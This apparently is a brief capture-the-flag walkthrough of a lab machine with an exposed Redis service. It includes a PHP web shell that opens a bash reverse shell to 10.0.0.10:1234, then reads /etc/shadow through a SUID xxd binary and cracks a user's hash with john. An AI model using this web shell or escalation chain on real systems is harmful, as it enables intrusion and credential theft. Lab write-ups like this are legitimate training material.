2 ports:

redis/6379

never experienced REDIS so using this post to learn more:
https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

using the command 'redis-cli' we can access the redis server:
we can run commands such as:
# info
where we find a user 'vianka'

using this, we can get a webshell by using this php/bash shell code:

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>

we found user.txt

running linpeas reveals xxd as suid binary

which can be exploited

we can read the /etc/shadow file with this and therefore run john on the user vianka's hash and get the password: beautiful1
